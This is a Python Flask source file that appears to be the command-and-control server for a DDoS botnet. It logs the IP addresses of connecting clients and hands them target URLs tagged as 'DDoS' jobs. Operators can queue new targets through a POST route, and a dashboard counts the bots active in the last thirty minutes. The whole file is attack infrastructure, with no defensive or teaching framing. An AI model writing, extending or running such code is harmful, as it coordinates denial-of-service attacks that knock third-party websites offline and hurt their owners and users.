import flask
from flask import request, jsonify, Flask, render_template
import db
import pymongo
from datetime import datetime, timedelta
import functions
import config

config = config.get_config()

app = Flask(__name__)

@app.route("/get_version/")
def get_version():
    with open("version.txt", "r") as f:
        version = f.read()

    return jsonify({"version": version})

@app.route("/ping/")
def ping():
    ip_address = request.remote_addr
    db.pings_collection.insert_one({"ip": ip_address, "time": datetime.now(), "access_route": request.access_route})

    to_prioritize = functions.check_and_notify()

    return jsonify({"status": "ok", "prioritize": to_prioritize})

@app.route("/get_job/")
def get_job():
    job = list(db.jobs_collection.find({"done": False}, sort=[("priority", pymongo.ASCENDING)]))

    jobs = []

    for jobbet in job:

        if not jobbet == None:


            jobs.append(jobbet["url"])


    if len(jobs) == 0:
        return jsonify({"status": "no_jobs"})

    return jsonify({"status": "ok", "url": jobs, "job_type": "DDoS"})
    
@app.route("/add_job/", methods=["POST"])
def add_job():
    data = request.json

    job_type = data.get("job_type", None)

    if not job_type in ["DDoS"]:
        return jsonify({"status": "error", "message": "Invalid job type!"})

    if job_type == "DDoS":
        target_url = data.get("target_url", None)

        db.jobs_collection.insert_one({"url": target_url, "job_type": job_type, "done": False, "priority": functions.get_highest_priority()+1})

    return jsonify({"status": "ok"})


@app.route("/get_clients_count/")
def get_clients_count():
  
    from datetime import datetime, timedelta
    import pytz

    # Define the timezone
    timezone_utc_minus_3 = pytz.timezone("UTC")

    # Get the current time in UTC
    current_time_utc = datetime.now(pytz.utc)

    # Calculate thirty minutes ago in UTC-3
    thirty_minutes_ago_utc_minus_3 = current_time_utc - timedelta(minutes=30)

    count = db.pings_collection.count_documents({"time": {"$gte": thirty_minutes_ago_utc_minus_3}})


    # Convert the datetime to the specified timezone
    thirty_minutes_ago = thirty_minutes_ago_utc_minus_3.astimezone(timezone_utc_minus_3)

    # Now you can use the 'thirty_minutes_ago' variable in your MongoDB aggregation
    counts_over_time = list(db.pings_collection.aggregate([
        {"$match": {"time": {"$gte": thirty_minutes_ago_utc_minus_3}}},
        {"$group": {"_id": {"$dateToString": {"format": "%Y-%m-%d %H:%M", "date": "$time"}}, "count": {"$sum": 1}}},
        {"$sort": {"_id": 1}}  # Sort by "_id" in ascending order
    ]))


    return jsonify({"clients_count": count, "clients_counts_over_time": counts_over_time})


@app.route("/get_jobs_list/")
def get_jobs_list():
    jobs = list(db.jobs_collection.find())
    for job in jobs:
        job["_id"] = str(job["_id"])
    return jsonify({"jobs": jobs})

# Route for serving the HTML dashboard
@app.route("/")
def dashboard():
    return render_template("index.html")

if __name__ == "__main__":
    app.run(config.get("host"), config.get("port"))